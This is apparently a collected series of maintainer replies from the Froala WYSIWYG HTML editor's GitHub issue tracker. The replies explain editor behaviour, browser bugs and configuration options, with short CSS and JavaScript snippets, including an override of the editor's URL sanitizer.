htmlDoNotWrapTags.\n. Paragraph format is converting the entire paragraph, not only the selected part of text. Isn't it working this way?\n. Paragraph format is referring to the entire paragraph. That's exactly how Word/Google Docs works. We won't change this behaviour that users are familiar with.\n. They are doing this only when the entire paragraph has that font size height. I added this on our feature list and we'll review it.\n. That is by design so that the user would know that the image is clickable. If you want to customize that then you could add the following css rule: .fr-element img { cursor: default !important; }\n. See https://github.com/froala/wysiwyg-editor/issues/1168#issuecomment-205298672.\n. That's happening because you're wrapping everything inside a SPAN. Inside contenteditable span tags are highly sensitive and it's always better to use a DIV for such situations. You can read more about that here too: http://stackoverflow.com/questions/18492256/displaying-an-element-similar-to-p-inside-a-span.\n. When code is loaded initially in the application, it doesn't have new lines between the P an UL. When it gets to the code view, then it gets a new line and that new line would further on get converted to a NBSP. In V2, we added in a new way for handling spaces which converts to non-breaking spaces where necessary. \nI am reopening this for now and marking it as enhancement and will be rechecked/improved later on.\n. That has been fixed in a commit yesterday.\n. This is already on our feature list and there is high interest for it. Unfortunately, I cannot tell you an ETA for it. I am closing this here because we're not keeping Feature Requests anymore on the Github repo.\n. And a quick note: to exit from lists mode you should hit ENTER only on a blank line. SHIFT + ENTER will add new lines inside the last list item, but won't get out of list mode.\n. Thanks for the feedback, I truly appreciate it. The current color plugin works for most of our customers and if you are looking for something else it could be easily extended to something else. We got requests for allowing to enter their own hexa and we'll most likely add such a feature soon. I am closing this for now because we do not accept feature requests here on Github.\n. We had in V1 some methods for merging all these together. However, there were some cases when the performance dropped a lot and lots of reports of users who were not happy with this. We're currently doing some research on some alternatives to these. I will close, this because we don't keep feature requests here, but I can assure you that we're working on it. Thanks for the feedback!\n. That is the correct behaviour because markers are being added before and after the selection. selection.isFull is designed to check if everything inside the editable area is selected and in this case markers are not.\n. Is the LI tag empty? If the LI tag is empty, then a BR is being added inside it because other-way it is not possible to type in it. Also, inside UL according to the HTML specs, you should not have other child than LI.\n. Actually, the BR tag is being inserted before the nested list. That is the correct behaviour and it is done in order to allow users to type text inside the nested LI. If you want to change this behaviour, you could change the editor JS, but we won't make such a change.\n. Sure: https://www.froala.com/wysiwyg-editor/docs/examples/font-family.\n. \ud83d\udc4d \n. The editor is using the default browser commands for subscript/superscript. The problem is caused by Boostrap adding the following CSS rule which makes the browser not recognize the text as beign sub/sup.\ncss\nsub, sup {\n  vertical-align: baseline;\n}\n. Could you confirm that if you hit the Bold button twice to disable it, then it works fine?\n. Are you hitting ENTER?\n. Where do you have the cursor initially?\n. There is text on the first line. Are you putting it at the start of the line, middle of the line or end of the line?\n. At a further check this appears to be an issue which happens on IE when using iframe https://jsfiddle.net/m4u5d5j7/. We'll try to see if there is any possible workaround for it or we have to wait until Microsoft will fix it.\n. Reported to Microsoft: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/7304837/\n. Probably it will take years until Microsoft fixes it. Last commit should do that. Could you confirm?\n. We consider this an enhancement and not a bug because this is how browsers treat contenteditable=\"false\" inside contenteditable=\"true\". It is the same thing as https://github.com/froala/wysiwyg-editor/issues/1188 which was fixed during last week. This issue will be addressed shortly as well.\n. Last commit is fixing this by changing the way line breaker can insert new lines. Now, if you will go with mouse at the top/bottom of the video you will be able to insert a line break there. Ideally, it would have been to have this implemented the way image works, but the info we get from the browser on click is not relevant enough for this case.\n. The editor is designed to produce HTML 5 output and there is no built-in option for what you're asking. If you want to make the output HTML valid, then you could use the html.get event and do the changes you need on the HTML output.\n. First of all, there is a duplicate style attribute and the browser will render only the first one. When the editor is loaded, it converts inline CSS to classes and removes those properties which might be duplicate. There is a list of them: margin, float, display, z-index, position, overflow, vertical-align. This is the intended behaviour.\n. That is the intended behaviour. It should remove margin and float and apply classes based on them. If you want not to have this happen, then you can remove the imageDisplay and imageAlign buttons from imageEditButtons option. \n. We are encouraging using classes over inline style for cleaner output. We start from the idea that any content that is loaded inside the editor should have been previous edited with the editor. Of course, there might be cases when the content might come from other places where it was edited with other editor, but in that case it would be migrated to how Froala Editor works. We are following this behaviour since the very first version of the editor and we believe this is the way to go.\n. No, there is not builtin way in the editor for doing that. You'd have to play with the commands.applyProperty for achieving that.\n. Yes, we're currently working on something built-in.\n. @george-norris-salesforce see format.apply option. . That is not the correct approach. If you want to do such a thing, then you can use the URLs plugin where we're converting text to URLs as a starting point.\n. Unfortunately, we can't do nothing about it. We've played around with that few months ago and there is no workaround because that's how IE is placing the cursor incorrectly. Same thing happens in a blank contenteditable element: https://jsfiddle.net/f87p3s65/133/.\n. Not documented yet, but last commit is adding a new method called format.removeStyle(prop) which can be used for this purpose.\n. Works fine with master branch.\n. It doesn't make sense to actually do that. There might be users who remove the style attribute by a mistake and this way they get bunch of features not working: indent, font size, alignment, etc. Removing style attribute from htmlAllowedAttrs is a big customization and who does that should change the other things in the editor. Indent/outdent methods can be easily overwritten to do nothing like this: \njs\n$.FE.MODULES.commands.indent = function () {};\n$.FE.MODULES.commands.outdent = function () {};\n. Actually test and test/other_test is considered as being an URL and it should be prefixed. There are several developers using the editor in LAN and they have a short domain name set.\n. @lemnis @forum-is there are definitely different possible scenarios. The one we have currently implemented is what works best based on the feedback we received. If you want to achieve a different behaviour, I would recommend you to create a wrapper over the link insert method and change the href based on your needs.\n. We're no longer supporting v1. Please upgrade to v2. \n. What IE version are you using exactly? I couldn't reproduce it with IE 10.0.9200.17148.\n. That is not possible for now. It is something we're working on.\n. I cannot reproduce it. Could you please make a recording? Thank you.\n. Can you reproduce it on our website?\n. Is it from the main page or other page?\n. Hi Rob! Is this happening on V2.2.4? I can't replicate it on our website.\n. No change: https://www.froala.com/wysiwyg-editor/docs/examples/iframe \n. It works locally with the same editor options, but not on jsFiddle. Most likely it has something to do with the way jsFiddle is displaying the output.\n. Could you try to reproduce it on a basic example and send a ZIP with the files? Or maybe send a link to the exact page where you have this problem? Thank you.\n. @philfreo the editor is sanitizing the urls in order to prevent XSS attacks. If you want to permit different URLs, you could use the following code to change the default behavior. Just make sure you include it before initializing the editor.\n``` js\nvar original_helpers = $.FE.MODULES.helpers; \n$.FE.MODULES.helpers = function (editor) { \n  var helpers = original_helpers(editor); \nvar isURL = helpers.isURL();  \n// This is the original sanitizer.\n  helpers.sanitizeURL = function (url) { \n      if (/^(https?:|ftps?:|)\\/\\//i.test(url)) {\n        if (!isURL(url) && !isURL('http:' + url)) {\n          return '';\n        }\n      }\n      else {\n        url = encodeURIComponent(url)\n                  .replace(/%23/g, '#')\n                  .replace(/%2F/g, '/')\n                  .replace(/%25/g, '%')\n                  .replace(/mailto%3A/gi, 'mailto:')\n                  .replace(/file%3A/gi, 'file:')\n                  .replace(/sms%3A/gi, 'sms:')\n                  .replace(/tel%3A/gi, 'tel:')\n                  .replace(/notes%3A/gi, 'notes:')\n                  .replace(/data%3Aimage/gi, 'data:image')\n                  .replace(/blob%3A/gi, 'blob:')\n                  .replace(/webkit-fake-url%3A/gi, 'webkit-fake-url:')\n                  .replace(/%3F/g, '?')\n                  .replace(/%3D/g, '=')\n                  .replace(/%26/g, '&')\n                  .replace(/&/g, '&')\n                  .replace(/%2C/g, ',')\n                  .replace(/%3B/g, ';')\n                  .replace(/%2B/g, '+')\n                  .replace(/%40/g, '@')\n                  .replace(/%5B/g, '[')\n                  .replace(/%5D/g, ']')\n                  .replace(/%7B/g, '{')\n                  .replace(/%7D/g, '}');\n      }\n  return url;\n\n}; \nreturn helpers;\n} \n```\n. @dularion please see: https://jsfiddle.net/63qq3uqk/3/. It's already fixed on the master version from Github. 7a96c27f3002d69859a4254345ea6487679903de\n. See https://www.froala.com/wysiwyg-editor/docs/concepts/custom-button. \njs\n  // Called when the button is hit.\n  callback: function () {\n    // The current context is the editor instance.\n    console.log (this.html.get());\n  }\nPS: For tech support please contact us via our website. We use this repo only for bug tracking. Thank you.\n. The editor is using the browser spellcheck option and it appears Safari and IE work different than Chrome and they show the error when you go with the cursor over. Unfortunately, we cannot do anything to address it for now.\n. It's already fixed here on master.\n. If you have a textarea on which you initialize the editor, you can do the following.\nhtml\n<form id=\"myForm\">\n    <textarea name=\"foo\"></textarea>\n</form>\njs\n$('#myForm [name=\"foo\"]').on('froalaEditor.contentChanged', function () {\n    // Revalidate field.\n    $('#myForm').formValidation('revalidateField', 'foo');\n});\n. It's fixed on master.\n. @hardikrazoo this was fixed in V2.3.0. In case you have this problem, you might have not updated the editor correctly or it might be something related to your specific environment.\n. @hardikrazoo Are you able to reproduce it on our website?\n. It's already fixed on master.\n. This should be fixed on master.\n. You can do it using the events.on method and pass true for the last argument. This will bind your event before other events in the editor.\n. It would be best to use the manual initialization for that: https://github.com/froala/angular-froala-wysiwyg#manual-initialization.. You mean cursor location?\n. Can you provide any additional details about it? Maybe could you send us an email with a link to a page where to replicate this problem?\n. @philfreo We have tried several scenarios, but we cannot reproduce it. I believe you might have some CSS on the page which targets that textarea or it is a specific height when that is happening. Unfortunately, without a place where this is happening we cannot help. I am closing this until we get more details. Thank you.\n. Last commit changes it to use label instead of span. Overriding it is not actually as hard. The following CSS restores it very close to what Bootstrap looks like.\n``` css\n.fr-popup .fr-input-line input[type=\"text\"], .fr-popup .fr-input-line textarea {\n  border: solid 1px #CCC;\n  padding: 5px;\n  margin: 0;\n}\n.fr-popup .fr-input-line input[type=\"text\"]:focus, .fr-popup .fr-input-line textarea:focus {\n  border: solid 1px #1e88e5;\n}\n.fr-popup .fr-input-line {\n  padding: 15px 0;\n}\n.fr-popup .fr-input-line input + label, .fr-popup .fr-input-line textarea + label {\n  color: #000;\n  display: block;\n  font-size: 12px;\n  font-weight: bold;\n}\n``\n. We're currently working on creating more theme files and extending a bit the flexibility of the LESS file.\n. Hi Phil! SettinglinkAlwaysBlanktotrueremoves the \"Open in new tab\" checkbox altogether and setstarget=\"_blank\"to links. If it doesn't in your tests, then please make sure you're using the latest version.\n. When shortcuts are disabled, it means that the editor doesn't interfere with the browser behaviour. Chrome for example is doing bold when you hit CTRL+B inside a contenteditable and the editor behaviour is correct. If you want to prevent that, then you should listen to the keydown event and prevent it from doing that.\n. Have you tested this on master?\n. Yes, it might be fixed. Would appreciate if you can give it a go.\n. That is right, it's still happening on master. We've checked it yesterday when added theenhancementlabel. Thanks for checking.\n. This has been fixed few days ago here on the master version. Please see: https://github.com/froala/wysiwyg-editor/issues/1213#issuecomment-218776967.\n. Are you able to reproduce it on [our website](https://www.froala.com/wysiwyg-editor)?\n. Please make sure you're using latest editor version V2.2.4.\n. To remove draggable you should disable imageMove option. To remove fr-dib you should not include the imageAlign and imageDisplay buttons inside imageEditButtons option.\n. If you already have fr-dib in the HTML you initialize the editor with it, it won't be removed. You'd have to use a regex for that.\n. Are you using the master version or an older version?\n. Last commit updates this behaviour. Additionally to removing those buttons, you should setimageDefaultAlignandimageDefaultDisplaytonull.\n. @Neha2900 if you don't want to use image classes, please make sure that you follow https://github.com/froala/wysiwyg-editor/issues/1270#issuecomment-220055079.. @Neha2900 @abhishekparidaadl it looks the problem you have is not related to this issue. Also, please explain what is the problem you are facing in more details and the steps to reproduce it.. Don't have an ETA for it yet.\n. Nice catch \ud83d\udc4d .\n. No, there is no built-in method in editor for getting the text only and we believe this is out of the editor's scope. Converting HTML to TEXT is not as easy as it might look because of the way new lines have to be placed. https://github.com/werk85/node-html-to-text is a library which does that.\n. What are you initializing the editor with?\n. I cannot reproduce it with the current master. Could you make a jsFiddle? Thank you.\n. That is right, is should be a blank string instead. Could you please make a PR there? Thank you.\n. Hi Ruslan! We use this repo for bug tracking only. For tech support please contact us via [our website](https://www.froala.com/wysiwyg-editor/contact). Thanks!\n. Hi Joshua! This looks like a problem on your server side, not editor. We use this repo for bug tracking only. If you have questions or need help integrating the editor please [contact us](https://www.froala.com/wysiwyg-editor/contact) instead of opening an issue.\n. Unfortunately, this option is not available on touch devices because of system limitations.\n. Sorry, by touch devices in the last email, I was referring to the iOS ones.\n. Actually, you should be able to bring focus to the toolbar from the editable area. It's not a good idea to have to tab through buttons before getting the focus to the main editable area.\n. I changed this tofeature-requestand it will come over the following months. We're currently working on this feature.\n. It's not actually an issue because it doesn't affect in any way the output. I marked it asenhancement.\n. I just checked this and we believe that this is actually a render problem of the browser console. If you would search for the parent of that element in DOM and check the childNodes then those\"\"are not there.\n. That is because there is a very high amount of text there to render. That is why we don't recomment at all to use images as base64.\n. We use GitHub Issues as the official bug tracker for the Froala WYSIWYG HTMl Editor. For questions or need help integrating the editor please [contact us](https://www.froala.com/wysiwyg-editor/contact) instead of opening an issue.\n. The current behaviour is correct. \n- Hitting enter at the beginning of a list item (as you do in the 2nd recording) should create a new empty list item above. \n- Hitting enter at the end of a list item (as you do in the first recording) should create a new empty line an put the cursor inside it and hitting enter again should get you out of the list.\n. In the 2nd recording you're hitting enter in a different place: at the beginning of a list item instead of at the end of a list item. The editor behaves just like MSWord.\n. We use GitHub Issues as the official bug tracker for the Froala WYSIWYG HTMl Editor. For questions or need help integrating the editor please [contact us](https://www.froala.com/wysiwyg-editor/contact) instead of opening an issue.\n. That is on purpose because triggering contentChanged while editing in code view might result in having bad formatted HTML which is not desired. When in codeView mode, you can get the HTML usingcodeView.get()method.\n. @lostinpatterns The edits made in code view should be cleaned before inserting them in the text view. Doing that on every change from the code view is a slow operation and it might also result in HTML which is not properly written. For example, your users are starting to type in the code view<img sr` and they leave it like this for a while. Now contentChanged is triggered and you get some bad HTML which the user hasn't intended to save. \n. There is no built-in feature for tracking code-view changes.\n. I think something like this should work:\njs\ncode_mirror = $(selector).data('froala.editor').$box.find('.CodeMirror')[0].CodeMirror;\n. @craigbroadbear See https://github.com/froala/wysiwyg-editor/issues/1465#issuecomment-248628572.\n. This is an unusual case which the editor won't deal with because you have H3 which is a block tag inside a SPAN which is a markup impossible to generate using the editor. Also such markup is not W3C valid and it will generate an error when you try to validate it: Element h3 not allowed as child of element span in this context.\n. linkAutoPrefix option was designed to add a prefix to all inserted links in the editor. There are cases when someone would want to set the prefix to /foo and have this prefix for all the links inserted. Anyway, this option could be improved a little and we have it on our TODO list. Thanks for the suggestion - I am closing this here because we keep only issues on Github.\n. Language cannot be set after initializing the editor. It has to be destroyed and initialized again with the new option.\n. You can destroy the editor instance by calling the destroy method. Then you can reinitialize it manually: https://github.com/froala/angular-froala/blob/master/demo/index.html#L82.\n. That is fixed in the current master.\n. 404 means that the image could not be found at the returned URL. It is not an editor issue, but something related to your server side integration. We use GitHub Issues as the official bug tracker for the Froala WYSIWYG HTMl Editor. For questions or help integrating the editor please contact us instead of opening an issue.\n. Both rules are necessary: one is for images inside the editable area and one is for using the editor initialized directly on the image.\n. Fullscreen plugin is adding that zIndex when it gets to the fullscreen, but as soon as you toggle back, the zIndex is reset back to its original value.\n. The emoticons plugin is fairly easy to extend further. I put this on our TODO list and we'll add it if there is interest for it. \n. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. It is on our feature list, but I cannot tell you when it will be implemented.\n. Please let us know the steps to reproduce this. Is it happening on our website as well?\n. There is an option to disable it: toolbarSticky. But how can we reproduce it?\n. The option is called heightMin, not minHeight. When option height is set, the option heightMin and heightMax are ignored.\n. See https://github.com/froala/wysiwyg-editor/issues/1134.\n. Unfortunately, that's a wontfix. This is the way browsers recognize it inside contenteditable elements.\n. We do not maintain V1 of the editor anymore. Please upgrade to V2 instead.\n. Indeed, the popups are stopping some mouseup/mousedown events inside the popups so that the focus/blur events work correctly. However there are some possible workarounds. We got your email and we're waiting more details there. Thank you.\n. It has been removed few days ago. Thanks!\n. It's not an editor problem. This is happening because you have contenteditable property set to the div on which you're initializing the editor. Removing that will make it work just fine.\n. It is impossible for us to help you with that without having the steps to reproduce the issue.\n. It is hard to tell what could be without being able to reproduce it. The toolbar is being positioned based on the scrollableContainer scrolling in the page.\n. The editor has a CSS property which makes sure the image width never exceeds it's margins. When you have a height set explicitly then it is normal to have it distorted when resizing the window to a smaller width. You could remove the max-width property if you don't want this behaviour to happen. It wouldn't be a good thing to resize the image when you resize the window size.\n. Could you please make a jsFiddle for it?\n. https://jsfiddle.net/zz5zew0o/\n. We couldn't reproduce it. Are there any specific configurations?\n. @rblin081 there is no jsFiddle there. I believe you missed it :-)\n. Enabling the option @masseuro suggested should get it work the way you want.\n. Thanks for the suggestion. I am closing this because we use this repo for bug tracking only not for FR.\n. That is the correct behaviour because you have new lines with BR inside a paragraph block. It is the same as having one line, converting it to list and then hitting SHIFT+ENTER at the end of the line.\n. That is already done for videos. It's unlikely to add such a feature in the editor because it can be easily achieved with a plugin.\n. @mwtorkowski we plan to add an option there for this behaviour. There are lots of users who want to prevent deleting these blocks.\n. Indeed and fr-deletable is experimental for now. Although, there are no known issues, we haven't had enough time to test it and that's why it is not documented anywhere on our website.\n. @Spicykoala @mwtorkowski fr-deletable should work without problems now with the current master.\n. fr-selection class is added if displaySelection property is passed as true when calling RegisterCommand.\n. This is a Chrome problem that we reported to them (https://bugs.chromium.org/p/chromium/issues/detail?id=606331). We made a workaround for it in V2.3.0, so if you upgrade to the latest version you shouldn't have it anymore.\n. We do our best to make the changelog as explicit as possible. Unfortunately, we don't have any mailing list with more explicit details.\n. That iframe has a small width and because of that the editor is showing the buttons for that specific screen size. See https://www.froala.com/wysiwyg-editor/docs/examples/custom-toolbar.\n. @grrinch What editor version are you using? This should be fixed starting with V2.3.0.\n. This is an issue introduced there in Chrome recently. We put a fix for it on V2.3.0 and also filled an issue to Chrome to report it: https://bugs.chromium.org/p/chromium/issues/detail?id=606331. Upgrading from V2.2.4 to V2.3.0 should fix the problem for you.\n. This should be fixed on the current master.\n. It's fixed on master. \n. @Whyves  In the following days.\n. Same with https://github.com/froala/wysiwyg-editor/issues/1331 and fixed.\n. The editor has by default overflow-x: auto and the scroll gets active if the width is larger.\n\n. @javeriaanwer please see: https://www.froala.com/wysiwyg-editor/docs/options#iframeStyle.. @jpgilchrist html.get is designed to return the current HTML from the editor. While editing in code view mode, we consider that being an intermediary step and not the final HTML. Please read more about that on https://github.com/froala/wysiwyg-editor/issues/1297#issuecomment-221818721.\n. @alexsup Would it be possible to create a jsFiddle? Thanks.\n. The jsFiddle you sent is using V2.0.0-rc3. Using any version higher than 2.3.0 doesn't have this problem.\n. Are you experiencing the same problem on our website as well?\n. I am closing this due to lack of response. In case you can provide the details for us to reproduce it, we're happy to check it further.\n. That has been fixed in commit 4113307. Please upgrade to the Github master to fix it.\n. @Dattaprasad-Choukekar, there was indeed a small problem that we fixed. However, please be aware that in the zip you sent you are setting the scrollable container to #edit which is the same element you're initializing the editor on which is not correct. scrollableContainer should be a parent of the element on which you're initializing the editor.\n. That is going to be included in V2.3.4. In the meanwhile you could download it from Github and use it.\n. Thanks for the suggestion @antho1404. Actually we're currently working on a new feature for that. I am closing this for now because we keep here only bugs/enhancements not feature requests.\n. @vanerleo not yet.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. The event is working just fine with the Github master. Please make a jsFiddle in case you believe there is still an issue. Also, please follow the template for reporting an issue.\n. Here is how you can edit it:\njs\nvar $popup = editor.popups.get('image.insert');\nvar $layer = $popup.find('.fr-image-progress-bar-layer');\n$layer.find('h3').text('Your message');\nWe use GitHub Issues as the official bug tracker for the Froala WYSIWYG HTMl Editor therefore for tech support please contact us via our website.\n. @rubyruy last commit fixes it. Regarding image.insert, it takes a 2nd parameter sanitize which when is true the URL is sanitized.\n. The code beautifier is just for showing the code beautified in code view. It is not possible to get the code beautified and actually I don't see any reason for doing that. If you want to have to code beautified, I would recommend to use a 3rd party plugin to format the outputted HTML.\n. commands.applyProperty was removed in v2.3.0. format.appleStyle can be used instead. Please make sure you have updated the plugins as well, not only the main file.\n. See https://www.froala.com/wysiwyg-editor/docs/options#htmlRemoveTags.\n. Are you experiencing this outside of jsFiddle? I have just tried it on a blank editor instance on local environment and this problem doesn't seem to happen. I believe jsFiddle might block somehow that script.\n. The editor requires jQuery at least 1.11.0.\n. Last commit fixes it. When you hit backspace for the 2nd time and it is resetting the format that is the correct behavior - it was designed to work that way.\n. This is by design. Please see https://github.com/froala/wysiwyg-editor/issues/1297#issuecomment-221818721.\n. https://www.froala.com/blog/styling-emails-with-wysiwyg-html-editors\n. No, there is no such way built-in the editor. I marked this as feature-request, but I will close this issue because we don't keep FR here.\n. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. We are working on a feature to allow premises for image upload options and that will be available shortly.  We use this repo mainly for bug tracking, therefore please contact us via our website for any feature request or tech question. \ud83d\ude04 \n. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @mrjlynch this issue appears to be fixed, most probably by a different previous commit with a related problem. @reallyrobkerr we're working on an improved Word Paste that will come shortly.. @delian7 we cannot reproduce it on the codepen you provided. Could you please check?. Latest commit fixes it.. The editor is designed to keep all the style that the user sees when he edits the content in the output. If you want to clean those styles, I would recommend you to use a regular expression instead on the resulted HTML.\n. When you disable the useClasses option, the editor converts the style from CSS files to inline styles. This way it would keep the style when you send an email for example. You can read more about that on our blog: https://www.froala.com/blog/styling-emails-with-wysiwyg-html-editors.\nIt keeps fr-original-class and fr-original-style attributes in order to edit the HTML again in the editor without using inline style.\n. Most probably you are not setting those attributes correctly, adding that code after initializing the editor. Could you please make a jsFiddle?\n. You can just create a jsFiddle and ignore the unlicensed message. That doesn't limit any of the editor's features. Just set a height to the editor so that it makes the editable area high enough.\n. We're aware of this and it has a high priority. Will be fixed before releasing the next version 2.3.4.\n. Please let us know the steps to reproduce this problem. It would be great if you can make a jsFiddle for it.\n. @MotorFu Could you please send us the HTML you're inserting into the editor? \n. The problem actually comes from adding BR tag inside the section. There are 2 possible approaches for this:\n1) Remove section from $.FE.BLOCK_TAGS.\n2) Use span tag instead of section.\n. Please see https://github.com/froala/wysiwyg-editor/issues/1297#issuecomment-221818721. Could you please describe why would you need such an event? So far we haven't really seen a good case for it.\n. That is the intended behaviour. When edit is off, you shouldn't be able to do anything inside the editable area.\n. @nicooprat We cannot reproduce it. Could you please make a jsFiddle?\nPS: With the master version jsFiddle is no longer showing that unlicensed message.\n. You could use htmlAllowedTags: ['.*'] if you want to allow all the tags in the editor. You should also check the htmlRemoveTags option which by default is stripping the style and script tags.\n. &#xA0; is the same with &nbsp; http://stackoverflow.com/questions/7511214/what-is-the-difference-between-x00a0-and-160.\n. @nickian could you please send us the HTML you're using?\n. The option is called htmlAllowedTags in V2.\n. The option htmlAllowedTags in V2. \ud83d\ude04 \n. It is specific enough but it can't be more specific than a rule for the same area which contains an id. For that you'd need 10 classes according to the specs (http://www.w3.org/TR/selectors/#specificity).\n. @philfreo The image plugin is using the same icons as the ones from the align plugin. We added there a check to define the icons if they are not already defined when using the image plugin.\n. It is not anymore.\n. That is the intende behaviour. The classes are converted to inline just when you take the HTML using html.get or from the textarea.\n. We designed this feature similar to how a CSS inliner tool would work. When you use such a tool you're not checking e output using a code view like tool.\n. To me this looks like a problem from Chrome browser and not something coming from the editor. See https://jsfiddle.net/cvwq3td5 and with the fix for it https://jsfiddle.net/cvwq3td5/1/. I just reported it to their bug tracking repo and waiting for a response: https://bugs.chromium.org/p/chromium/issues/detail?id=626293.\nIn the meanwhile, I would recommend to use the clearfix approach for the inner element.\n. It's because there is a padding set on the other TD elements. That's how tables work in HTML.\n. First of all if you want to use html, head and body tags you'd have to initialize the editor with fullPage option enabled. \nSecondly, in the HTML you're using you have a TD with width: 100% and 3 others with width: 35px. That's incorrect.\n. You should also check the htmlRemoveTags option.\n. htmlAllowedTags is removing only the tag, but keeps the content. htmlRemoveTags is removing the tag together with its content. script and tags are in htmlAllowedTags so that if you change htmlRemoveTags then you don't have to change another option.\n. Nice catch \ud83d\udc4d \n. This is not an editor glitch, but a Safari issue caused by the contenteditable attribute (see the top part where the editor is not used): http://codepen.io/anon/pen/PzOJxB. We'll report it to Apple as soon as possible.\n. Definitely. However, based on the response we got from them for other issues we reported, I don't think that will happen very soon.\n. It has been fixed on the Github master and will be included in the release V2.3.4.\n. This has been fixed on the Github master and the changes will be included in V2.3.4.\n. In couple of days.\n. Duplicate of #1401\n. Actually there is setting for that: https://www.froala.com/wysiwyg-editor/docs/options#imagePaste.\n. imagePaste option requires the image plugin. If you don't want to use the image plugin, you could as well use the pasteDeniedTags option.\n. We're using this repo for bug tracking only, not for tech support. If you have questions or need help integrating the editor please contact us instead of opening an issue.\n. Unfortunately, there is no such feature implemented in the editor so that the pasted content match the existing one. This is a feature request therefore I am closing this for now.\n. We keep feature requests internally. There is no need to do anything else. Thanks for posting it here.\n. @chenbrand Please read https://www.froala.com/blog/notice-of-chrome-browser-problem.\n. This is not happening with the master version. I believe you're using a version older than V2.3.3.\n. This is already fixed on the Github master.\n. Thank you the suggestion, @canesin. We use this repo only for bug tracking and not for feature requests, therefore I am closing this. \n. We keep all the feature-requests internally for now, but we'll make a page on our website for them shortly. \n. @amankapur see https://www.froala.com/wysiwyg-editor/examples/wiris..

We use this repo only for bug tracking and not for feature requests, therefore I am closing this. \n. Please see pasteDeniedTags and pasteDeniedAttributes options.\n. No, the editor is not free. In order to use it, you should purchase a license: https://www.froala.com/wysiwyg-editor/pricing\n. Here we keep track of bugs and developers can download and take the editor for a spin before purchasing a license.\n. You can use the minified version to test the editor, not on production website. To use it inside your app, you should purchase a license that fits your needs: https://www.froala.com/wysiwyg-editor/pricing.\n. You should use the iframe option if you don't want this. By default all the styles from the page affect what appears in the editor without the iframe option.\n. The useClasses transforms all the CSS style that is applied to the elements inside the editable area to inline CSS. That is how we believe it should work because when you see something in the editable area which has green color then that same color should appear in the output. \nIf you use the iframe option you could use the iframeStyle or iframeStyleFiles to set CSS only internal for the iframe. The iframe option is designed to isolate the editor CSS from the rest of the page and we actually encourage to enable it for email editing.\n. Actually not, because the editor needs the document object in order to work correctly. The document is one of the main objects that are required.\n. The problem with the iframe is that it requires to be in the DOM in order to set the data to it.\n. Indeed, it appears there is a glitch from our side. We'll address it shortly.\n. This is happening because you are calling the initialization on the editor only when your page is loaded. Instead, you should call this after each new rendering of the loop.\n. @philfreo is right. The issues is from Chrome and has been fixed in Canary.\n. Please see: https://www.froala.com/wysiwyg-editor/docs/examples/custom-toolbar\n. Here is how you can import it for JSPM:\n``` js\nimport jQuery from 'jquery';\nimport froala from 'froala-editor/js/froala_editor.min';\nfroala(jQuery);\njQuery('#editor').froalaEditor()\n```\n. Here is how I do it and it works fine:\nHTML\n``` html\n\n\n\n\n\n\n    foo\n  \n\n    System.import('jspm/main');\n  \n\n\n```\nJS\n``` js\nimport jQuery from 'jquery';\nimport froala from 'froala-editor/js/froala_editor.min';\nfroala(jQuery);\njQuery('#editor').froalaEditor()\n``\n. Please provide a way to replicate the problem, other way there is nothing we could do to help you with it.\n. @ravindueranga Yes, we could do that, but we look at issues which have full details about how to reproduce first. Providing that would make this issue be fixed faster.\n. @ravindueranga that is not enough. Please create a jsFiddle or provide a URL where we can reproduce it right away. Thank you.\n. Thanks for thisfeature request. We keep here only the bugs and enhancements, therefore I will close this for now.\n. @chrisdeeming On a further check it appears that Firefox has some problems in how they trigger the spell check mechanism and that's why we marked it as an enhancement. . We added an integration with WebSpellChecker: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/spell-checker/spell-checker.html. This will be live starting with version 2.5.2 that we're going to release in couple of days.. @philrykoff are you using the editor V1 or V2?data-fr-verified` is no longer used in V2.\n. Yes, please see: https://www.froala.com/wysiwyg-editor/docs/examples/at-js. Could you please create a jsFiddle?\nThank you\n. Please read https://www.froala.com/blog/notice-of-chrome-browser-problem\n. Indeed, those styles are not kept. It is on our TODO list to create a better Word cleaning algorithm and we expect to have it in place in the following months. I am closing this beacase it is a feature-request.\n. Could you please send us a link where we can reproduce it?\n. I am closing this because we cannot reproduce it. If you could provide the details to reproduce it, we would be happy to look over it.\n. @mattjhoughton are you able to reproduce this on the latest version 2.7.0? Could you make a jsFiddle? Thanks.. @jaredhughes @ConorHiggins this is how block-quotes were designed to work by default in the editor. This is how email clients and forum comments usually work. To get it work the way you want, it would be better to add a new option to Paragraph Format plugin and this way you can get quotes to work just like that.. The options for lists are called formatUL and formatOL. You are not passing them correctly.\n. Nice catch \ud83d\udc4d .\n. That is the way Amazon returns the key for the file.\n. @HusseinElMotayam actually it's not an editor issue. The HTML inserted is not just correct for nested lists because you have there the UL wrapped with a DIV. Instead, it should be like this: https://jsfiddle.net/froala/n3z8rkte/2/.\n. It depends on how you select it. To me it looks fine. Could you please make a recording?\n. You could use the image in Base64, however we do not recommend that because the browsers tend to slow down when the images are very high.\n. Would it be possible to create a jsFiddle to highlight this? We tried to reproduce it, but without success. \n. @nozpheratu It appears you're using an older version v2.0.0-rc.3. The current one is v2.3.4.\n. @Panman8201 we believe that on destroy, the editor should clear everything that is related to that element, including events under the froalaEditor namespace. Why is that breaking the ember plugin? \n. You could bind those events in the initialized callback of the editor for instance.\n. @chamnap we would recommend using CSS to hide stuff related to the toolbar.. That has been fixed in 9c66afc2fcc657732420d37238802e4f26a146be.\n. End of August most likely.\n. Please see: https://www.froala.com/wysiwyg-editor/docs/examples/custom-toolbar.\n. You are most likely using it incorrectly. We offer tech support via email for customers with Advanced/OEM licenses. If you have one, please contact us via our website https://www.froala.com/wysiwyg-editor/contact.\n. @array-addu that is because you're using V1, not V2.\n. https://github.com/froala/meteor-froala this is updated to V2.3.4.\n. Could you please let us know what video link are you using?\n. I just checked and this problem cannot be reproduced on our homepage.\n. I assume you're using the iframe: true option. Unfortunately, there is a browser limitation on this and you'd have to call the size.refresh method after you show the editor for 